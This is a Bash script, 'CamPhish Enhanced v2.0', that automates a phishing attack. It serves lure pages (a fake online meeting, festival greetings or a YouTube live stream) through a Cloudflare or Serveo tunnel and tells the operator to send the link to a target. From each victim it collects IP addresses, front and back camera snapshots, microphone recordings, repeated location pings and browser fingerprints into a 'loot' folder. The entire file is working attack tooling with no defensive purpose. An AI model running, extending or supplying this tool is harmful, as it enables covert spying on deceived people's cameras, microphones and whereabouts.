#!/bin/bash

# CamPhish Enhanced v2.0 — Automated Edition (Cloudflare)

# Non-interactive CLI automation for CamPhish

# Usage: ./camphish_auto.sh [OPTIONS]

#

# Examples:

#   ./camphish_auto.sh --tunnel cloudflare --template meeting

#   ./camphish_auto.sh --tunnel serveo --template youtube --yt-id dQw4w9WgXcQ --camera back

#   ./camphish_auto.sh --config camphish.conf



set -e

trap 'cleanup; printf "\n\e[1;93m[!] Caught interrupt, cleaning up...\e[0m\n"' 2



# ─── Defaults ───────────────────────────────────────────────────

TUNNEL="cloudflare"

TEMPLATE="meeting"

CAMERA_MODE="both"

SNAPSHOT_INTERVAL=1500

LOCATION_ENABLED="true"

LOCATION_INTERVAL=2000

MIC_ENABLED="true"

MIC_CHUNK_DURATION=10000

OUTPUT_DIR="./loot"

SERVEO_SUBDOMAIN=""

FESTIVAL_NAME="Diwali"

YOUTUBE_VIDEO_ID=""

AUTO_OPEN_BROWSER="false"

PHP_PORT=3333

CONFIG_FILE=""



# ─── Colors ─────────────────────────────────────────────────────

RED='\e[1;91m'

GREEN='\e[1;92m'

YELLOW='\e[1;93m'

BLUE='\e[1;94m'

CYAN='\e[1;96m'

WHITE='\e[1;97m'

RESET='\e[0m'



# ─── Banner ─────────────────────────────────────────────────────

banner() {

    clear

    printf "${GREEN}"

    printf "  ╔═══════════════════════════════════════════════════════╗\n"

    printf "  ║   ██████╗ █████╗ ███╗   ███╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗  ║\n"

    printf "  ║  ██╔════╝██╔══██╗████╗ ████║██╔══██╗██║  ██║██║██╔════╝██║  ██║  ║\n"

    printf "  ║  ██║     ███████║██╔████╔██║██████╔╝███████║██║███████╗███████║  ║\n"

    printf "  ║  ██║     ██╔══██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║  ║\n"

    printf "  ║  ╚██████╗██║  ██║██║ ╚═╝ ██║██║     ██║  ██║██║███████║██║  ██║  ║\n"

    printf "  ║   ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝  ║\n"

    printf "  ╠═══════════════════════════════════════════════════════╣\n"

    printf "  ║${CYAN}  Enhanced v2.0 — Automated (Cloudflare) ${GREEN}                ║\n"

    printf "  ║${WHITE}  Camera (F/B) + Location + Mic + Fingerprint ${GREEN}           ║\n"

    printf "  ╚═══════════════════════════════════════════════════════╝${RESET}\n\n"

}



# ─── Usage ──────────────────────────────────────────────────────

usage() {

    printf "${WHITE}Usage:${RESET} $0 [OPTIONS]\n\n"

    printf "${CYAN}Tunnel Options:${RESET}\n"

    printf "  --tunnel <cloudflare|serveo>  Tunnel service (default: cloudflare)\n"

    printf "  --subdomain <name>           Serveo subdomain\n\n"

    printf "${CYAN}Template Options:${RESET}\n"

    printf "  --template <meeting|festival|youtube>  Template (default: meeting)\n"

    printf "  --festival-name <name>       Festival name (for festival template)\n"

    printf "  --yt-id <id>                 YouTube video ID (for youtube template)\n\n"

    printf "${CYAN}Feature Options:${RESET}\n"

    printf "  --camera <front|back|both>   Camera mode (default: both)\n"

    printf "  --snapshot-interval <ms>     Snapshot interval in ms (default: 1500)\n"

    printf "  --location <on|off>          Enable geolocation (default: on)\n"

    printf "  --location-interval <ms>     Location ping interval in ms (default: 2000)\n"

    printf "  --mic <on|off>               Enable microphone (default: on)\n"

    printf "  --mic-chunk <ms>             Audio chunk duration in ms (default: 10000)\n\n"

    printf "${CYAN}General Options:${RESET}\n"

    printf "  --config <file>              Load config from file\n"

    printf "  --output <dir>               Output directory (default: ./loot)\n"

    printf "  --port <port>                PHP server port (default: 3333)\n"

    printf "  --auto-open                  Auto-open link in browser\n"

    printf "  --help                       Show this help\n\n"

    printf "${CYAN}Examples:${RESET}\n"

    printf "  $0 --tunnel cloudflare --template meeting\n"

    printf "  $0 --tunnel serveo --template youtube --yt-id dQw4w9WgXcQ --camera back\n"

    printf "  $0 --config camphish.conf\n"

}



# ─── Load Config ────────────────────────────────────────────────

load_config() {

    local file="$1"

    if [[ -f "$file" ]]; then

        printf "${GREEN}[+]${WHITE} Loading config from ${CYAN}%s${RESET}\n" "$file"

        while IFS='=' read -r key value; do

            # Skip comments and empty lines

            [[ "$key" =~ ^#.*$ ]] && continue

            [[ -z "$key" ]] && continue

            # Trim whitespace

            key=$(echo "$key" | xargs)

            value=$(echo "$value" | xargs)

            case "$key" in

                TUNNEL) TUNNEL="$value" ;;

                TEMPLATE) TEMPLATE="$value" ;;

                CAMERA_MODE) CAMERA_MODE="$value" ;;

                SNAPSHOT_INTERVAL) SNAPSHOT_INTERVAL="$value" ;;

                LOCATION_ENABLED) LOCATION_ENABLED="$value" ;;

                LOCATION_INTERVAL) LOCATION_INTERVAL="$value" ;;

                MIC_ENABLED) MIC_ENABLED="$value" ;;

                MIC_CHUNK_DURATION) MIC_CHUNK_DURATION="$value" ;;

                OUTPUT_DIR) OUTPUT_DIR="$value" ;;

                SERVEO_SUBDOMAIN) SERVEO_SUBDOMAIN="$value" ;;

                FESTIVAL_NAME) FESTIVAL_NAME="$value" ;;

                YOUTUBE_VIDEO_ID) YOUTUBE_VIDEO_ID="$value" ;;

                AUTO_OPEN_BROWSER) AUTO_OPEN_BROWSER="$value" ;;

                PHP_PORT) PHP_PORT="$value" ;;

            esac

        done < "$file"

    else

        printf "${RED}[!] Config file not found: %s${RESET}\n" "$file"

        exit 1

    fi

}



# ─── Parse CLI Args ─────────────────────────────────────────────

parse_args() {

    while [[ $# -gt 0 ]]; do

        case "$1" in

            --tunnel) TUNNEL="$2"; shift 2 ;;

            --subdomain) SERVEO_SUBDOMAIN="$2"; shift 2 ;;

            --template) TEMPLATE="$2"; shift 2 ;;

            --festival-name) FESTIVAL_NAME="$2"; shift 2 ;;

            --yt-id) YOUTUBE_VIDEO_ID="$2"; shift 2 ;;

            --camera) CAMERA_MODE="$2"; shift 2 ;;

            --snapshot-interval) SNAPSHOT_INTERVAL="$2"; shift 2 ;;

            --location)

                if [[ "$2" == "off" ]]; then LOCATION_ENABLED="false"; else LOCATION_ENABLED="true"; fi

                shift 2 ;;

            --location-interval) LOCATION_INTERVAL="$2"; shift 2 ;;

            --mic)

                if [[ "$2" == "off" ]]; then MIC_ENABLED="false"; else MIC_ENABLED="true"; fi

                shift 2 ;;

            --mic-chunk) MIC_CHUNK_DURATION="$2"; shift 2 ;;

            --config) CONFIG_FILE="$2"; shift 2 ;;

            --output) OUTPUT_DIR="$2"; shift 2 ;;

            --port) PHP_PORT="$2"; shift 2 ;;

            --auto-open) AUTO_OPEN_BROWSER="true"; shift ;;

            --help) usage; exit 0 ;;

            *) printf "${RED}[!] Unknown option: %s${RESET}\n" "$1"; usage; exit 1 ;;

        esac

    done

}



# ─── Dependency Check ───────────────────────────────────────────

check_deps() {

    printf "${GREEN}[*]${WHITE} Checking dependencies...${RESET}\n"



    command -v php > /dev/null 2>&1 || { printf "${RED}[!] PHP not installed. Aborting.${RESET}\n"; exit 1; }

    printf "${GREEN}  ✓${WHITE} PHP found${RESET}\n"



    if [[ "$TUNNEL" == "cloudflare" ]]; then

        # Check for local binary first, then PATH, then download
        if [[ -e ./cloudflared ]]; then

            printf "${GREEN}  ✓${WHITE} Cloudflared found (local)${RESET}\n"

        elif command -v cloudflared > /dev/null 2>&1; then

            ln -sf "$(which cloudflared)" ./cloudflared

            printf "${GREEN}  ✓${WHITE} Cloudflared found (system)${RESET}\n"

        else

            printf "${YELLOW}[!] Cloudflared binary not found. Downloading...${RESET}\n"

            command -v wget > /dev/null 2>&1 || { printf "${RED}[!] wget required for download. Aborting.${RESET}\n"; exit 1; }

            arch=$(uname -m)

            case "$arch" in

                aarch64|arm64)

                    wget -q --no-check-certificate -O cloudflared "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"

                    ;;

                armv7l|arm*)

                    wget -q --no-check-certificate -O cloudflared "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"

                    ;;

                x86_64|amd64)

                    wget -q --no-check-certificate -O cloudflared "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"

                    ;;

                i386|i686)

                    wget -q --no-check-certificate -O cloudflared "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"

                    ;;

                *)

                    printf "${RED}[!] Unsupported architecture: %s${RESET}\n" "$arch"

                    exit 1

                    ;;

            esac

            if [[ ! -e ./cloudflared ]]; then

                printf "${RED}[!] Download failed. Check internet connection.${RESET}\n"

                exit 1

            fi

            chmod +x ./cloudflared

            printf "${GREEN}  ✓${WHITE} Cloudflared downloaded${RESET}\n"

        fi

    elif [[ "$TUNNEL" == "serveo" ]]; then

        command -v ssh > /dev/null 2>&1 || { printf "${RED}[!] SSH not installed. Aborting.${RESET}\n"; exit 1; }

        printf "${GREEN}  ✓${WHITE} SSH found${RESET}\n"

    fi

}



# ─── Setup Output Dir ───────────────────────────────────────────

setup_output() {

    mkdir -p "$OUTPUT_DIR/camera" "$OUTPUT_DIR/audio"

    printf "${GREEN}[+]${WHITE} Loot directory: ${CYAN}%s${RESET}\n" "$(realpath "$OUTPUT_DIR")"

}



# ─── Inject Config into Templates ───────────────────────────────

inject_config() {

    local link="$1"



    printf "${GREEN}[+]${WHITE} Injecting payload config into templates...${RESET}\n"



    # Build index.php from template

    sed "s+forwarding_link+${link}+g" template.php > index.php



    # Determine which template to use

    if [[ "$TEMPLATE" == "festival" ]]; then

        sed "s+forwarding_link+${link}+g" festivalwishes.html > index3.html

        sed "s+fes_name+${FESTIVAL_NAME}+g" index3.html > index2.html

        rm -f index3.html

    elif [[ "$TEMPLATE" == "youtube" ]]; then

        sed "s+forwarding_link+${link}+g" LiveYTTV.html > index3.html

        sed "s+live_yt_tv+${YOUTUBE_VIDEO_ID}+g" index3.html > index2.html

        rm -f index3.html

    else

        # meeting (default)

        sed "s+forwarding_link+${link}+g" OnlineMeeting.html > index2.html

    fi



    printf "${GREEN}  ✓${WHITE} Template '${CYAN}%s${WHITE}' configured${RESET}\n" "$TEMPLATE"

}



# ─── Start Cloudflare Tunnel ──────────────────────────────────

start_cloudflare() {

    # Start PHP server

    printf "${GREEN}[+]${WHITE} Starting PHP server on port ${CYAN}%s${WHITE}...${RESET}\n" "$PHP_PORT"

    fuser -k "$PHP_PORT/tcp" > /dev/null 2>&1 || true

    php -S "127.0.0.1:$PHP_PORT" > /dev/null 2>&1 &

    PHP_PID=$!

    sleep 2



    # Start cloudflared quick tunnel (no auth needed)

    printf "${GREEN}[+]${WHITE} Starting Cloudflare tunnel...${RESET}\n"

    rm -f .cloudflared.log

    ./cloudflared tunnel --url "http://127.0.0.1:$PHP_PORT" > .cloudflared.log 2>&1 &

    CF_PID=$!



    # Wait for the tunnel URL to appear

    printf "${YELLOW}[*]${WHITE} Waiting for tunnel URL"

    for i in $(seq 1 30); do
        LINK=$(grep -o 'https://[a-zA-Z0-9_-]*\.trycloudflare\.com' .cloudflared.log 2>/dev/null | head -n1)
        if [[ -n "$LINK" ]]; then
            printf " ✓\n"
            break
        fi
        printf "."
        sleep 1
    done



    if [[ -z "$LINK" ]]; then

        printf "\n${RED}[!] Failed to get Cloudflare tunnel URL. Check:${RESET}\n"

        printf "${YELLOW}  - Internet connection is active${RESET}\n"

        printf "${YELLOW}  - No other cloudflared instance running (killall cloudflared)${RESET}\n"

        printf "${YELLOW}  - Check .cloudflared.log for errors${RESET}\n"

        exit 1

    fi



    printf "${GREEN}[+]${WHITE} Tunnel URL: ${CYAN}%s${RESET}\n" "$LINK"

}



# ─── Start Serveo Tunnel ───────────────────────────────────────

start_serveo() {

    # Start PHP server

    printf "${GREEN}[+]${WHITE} Starting PHP server on port ${CYAN}%s${WHITE}...${RESET}\n" "$PHP_PORT"

    fuser -k "$PHP_PORT/tcp" > /dev/null 2>&1 || true

    php -S "localhost:$PHP_PORT" > /dev/null 2>&1 &

    PHP_PID=$!

    sleep 2



    # Start serveo tunnel

    printf "${GREEN}[+]${WHITE} Starting Serveo tunnel...${RESET}\n"

    if [[ -n "$SERVEO_SUBDOMAIN" ]]; then

        ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \

            -R "${SERVEO_SUBDOMAIN}:80:localhost:${PHP_PORT}" serveo.net \

            2> /dev/null > sendlink &

    else

        ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \

            -R "80:localhost:${PHP_PORT}" serveo.net \

            2> /dev/null > sendlink &

    fi

    SSH_PID=$!

    sleep 8



    LINK=$(grep -o 'https://[0-9a-z]*\.serveo.net' sendlink)



    if [[ -z "$LINK" ]]; then

        printf "${RED}[!] Failed to get Serveo URL${RESET}\n"

        exit 1

    fi



    printf "${GREEN}[+]${WHITE} Tunnel URL: ${CYAN}%s${RESET}\n" "$LINK"

}



# ─── Live Dashboard ─────────────────────────────────────────────

show_config_summary() {

    printf "\n${BLUE}╔══════════════════════════════════════════╗${RESET}\n"

    printf "${BLUE}║${WHITE}        SESSION CONFIGURATION              ${BLUE}║${RESET}\n"

    printf "${BLUE}╠══════════════════════════════════════════╣${RESET}\n"

    printf "${BLUE}║${WHITE} Tunnel:     ${CYAN}%-28s${BLUE}║${RESET}\n" "$TUNNEL"

    printf "${BLUE}║${WHITE} Template:   ${CYAN}%-28s${BLUE}║${RESET}\n" "$TEMPLATE"

    printf "${BLUE}║${WHITE} Camera:     ${CYAN}%-28s${BLUE}║${RESET}\n" "$CAMERA_MODE"

    printf "${BLUE}║${WHITE} Snapshot:   ${CYAN}%-28s${BLUE}║${RESET}\n" "${SNAPSHOT_INTERVAL}ms"

    printf "${BLUE}║${WHITE} Location:   ${CYAN}%-28s${BLUE}║${RESET}\n" "$LOCATION_ENABLED (${LOCATION_INTERVAL}ms)"

    printf "${BLUE}║${WHITE} Microphone: ${CYAN}%-28s${BLUE}║${RESET}\n" "$MIC_ENABLED (${MIC_CHUNK_DURATION}ms chunks)"

    printf "${BLUE}║${WHITE} Loot Dir:   ${CYAN}%-28s${BLUE}║${RESET}\n" "$OUTPUT_DIR"

    printf "${BLUE}╚══════════════════════════════════════════╝${RESET}\n\n"

}



# ─── Monitor Loop ──────────────────────────────────────────────

monitor_loot() {

    local cam_count=0

    local audio_count=0

    local loc_count=0

    local ip_count=0



    printf "${GREEN}[*]${WHITE} Monitoring for incoming data... ${YELLOW}(Ctrl+C to stop)${RESET}\n\n"



    while true; do

        # Check for new IP hits

        if [[ -e "ip.txt" ]]; then

            ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')

            IFS=$'\n'

            printf "${GREEN}[+] ${WHITE}TARGET HIT! ${CYAN}IP: %s${RESET}\n" $ip

            cat ip.txt >> saved.ip.txt

            rm -f ip.txt

            ((ip_count++))

        fi



        # Check for new camera captures

        if [[ -e "Log.log" ]]; then

            printf "${GREEN}[+] ${WHITE}📸 Camera snapshot received!${RESET}\n"

            rm -f Log.log

            ((cam_count++))

        fi



        # Check loot directory for new files

        local new_cam=$(find "$OUTPUT_DIR/camera" -name "*.jpg" -o -name "*.png" 2>/dev/null | wc -l)

        local new_audio=$(find "$OUTPUT_DIR/audio" -name "*.webm" -o -name "*.ogg" 2>/dev/null | wc -l)



        if [[ $new_cam -gt $cam_count ]]; then

            local diff=$((new_cam - cam_count))

            printf "${GREEN}[+] ${WHITE}📷 ${CYAN}%d${WHITE} new camera file(s) in loot${RESET}\n" "$diff"

            cam_count=$new_cam

        fi



        if [[ $new_audio -gt $audio_count ]]; then

            local diff=$((new_audio - audio_count))

            printf "${GREEN}[+] ${WHITE}🎙️  ${CYAN}%d${WHITE} new audio chunk(s) in loot${RESET}\n" "$diff"

            audio_count=$new_audio

        fi



        # Check for location data

        if [[ -e "$OUTPUT_DIR/location_log.json" ]]; then

            local new_loc=$(python3 -c "import json; print(len(json.load(open('$OUTPUT_DIR/location_log.json'))))" 2>/dev/null || echo "0")

            if [[ "$new_loc" -gt "$loc_count" ]] 2>/dev/null; then

                printf "${GREEN}[+] ${WHITE}📍 Location update: ${CYAN}%s${WHITE} total pings${RESET}\n" "$new_loc"

                loc_count=$new_loc

            fi

        fi



        # Status line

        printf "\r${YELLOW}[⏳] Targets: %d | 📸 Cam: %d | 🎙️  Audio: %d | 📍 Loc: %d ${RESET}" \

            "$ip_count" "$cam_count" "$audio_count" "$loc_count"



        sleep 1

    done

}



# ─── Cleanup ────────────────────────────────────────────────────

cleanup() {

    printf "\n${YELLOW}[*] Cleaning up processes...${RESET}\n"



    # Kill cloudflared

    if [[ -n "${CF_PID:-}" ]]; then

        kill "$CF_PID" 2>/dev/null || true

    fi

    pkill -f cloudflared 2>/dev/null || true



    # Kill PHP

    if [[ -n "${PHP_PID:-}" ]]; then

        kill "$PHP_PID" 2>/dev/null || true

    fi

    fuser -k "$PHP_PORT/tcp" 2>/dev/null || true



    # Kill SSH (serveo)

    if [[ -n "${SSH_PID:-}" ]]; then

        kill "$SSH_PID" 2>/dev/null || true

    fi



    # Cleanup temp files

    rm -f sendlink index3.html .cloudflared.log



    printf "${GREEN}[✓] Cleanup complete${RESET}\n"



    # Print loot summary

    if [[ -d "$OUTPUT_DIR" ]]; then

        local total_cam=$(find "$OUTPUT_DIR/camera" -type f 2>/dev/null | wc -l)

        local total_audio=$(find "$OUTPUT_DIR/audio" -type f 2>/dev/null | wc -l)

        printf "\n${BLUE}═══════════ SESSION SUMMARY ═══════════${RESET}\n"

        printf "${WHITE}  Camera captures:  ${CYAN}%s${RESET}\n" "$total_cam"

        printf "${WHITE}  Audio recordings: ${CYAN}%s${RESET}\n" "$total_audio"

        if [[ -e "$OUTPUT_DIR/location_log.json" ]]; then

            local total_loc=$(python3 -c "import json; print(len(json.load(open('$OUTPUT_DIR/location_log.json'))))" 2>/dev/null || echo "?")

            printf "${WHITE}  Location pings:   ${CYAN}%s${RESET}\n" "$total_loc"

        fi

        if [[ -e "$OUTPUT_DIR/fingerprints.json" ]]; then

            local total_fp=$(python3 -c "import json; print(len(json.load(open('$OUTPUT_DIR/fingerprints.json'))))" 2>/dev/null || echo "?")

            printf "${WHITE}  Fingerprints:     ${CYAN}%s${RESET}\n" "$total_fp"

        fi

        printf "${WHITE}  Loot directory:   ${CYAN}%s${RESET}\n" "$(realpath "$OUTPUT_DIR" 2>/dev/null || echo "$OUTPUT_DIR")"

        printf "${BLUE}═══════════════════════════════════════${RESET}\n"

    fi



    exit 0

}



# ─── Main ───────────────────────────────────────────────────────

main() {

    # Parse args (config file first if specified)

    parse_args "$@"



    # Load config file if specified

    if [[ -n "$CONFIG_FILE" ]]; then

        load_config "$CONFIG_FILE"

        # Re-parse CLI args to override config file values

        parse_args "$@"

    fi



    banner

    check_deps

    setup_output

    show_config_summary



    # Start tunnel

    if [[ "$TUNNEL" == "cloudflare" ]]; then

        start_cloudflare

    elif [[ "$TUNNEL" == "serveo" ]]; then

        start_serveo

    else

        printf "${RED}[!] Invalid tunnel: %s${RESET}\n" "$TUNNEL"

        exit 1

    fi



    # Inject config into templates

    inject_config "$LINK"



    # Auto-open browser

    if [[ "$AUTO_OPEN_BROWSER" == "true" ]]; then

        if command -v xdg-open > /dev/null 2>&1; then

            xdg-open "$LINK" > /dev/null 2>&1 &

        elif command -v open > /dev/null 2>&1; then

            open "$LINK" > /dev/null 2>&1 &

        fi

    fi



    # Print the link prominently

    printf "\n${GREEN}╔══════════════════════════════════════════╗${RESET}\n"

    printf "${GREEN}║${WHITE}  🔗 SEND THIS LINK TO TARGET:            ${GREEN}║${RESET}\n"

    printf "${GREEN}║${CYAN}  %s${GREEN}${RESET}\n" "$LINK"

    printf "${GREEN}╚══════════════════════════════════════════╝${RESET}\n\n"



    # Start monitoring

    monitor_loot

}



main "$@"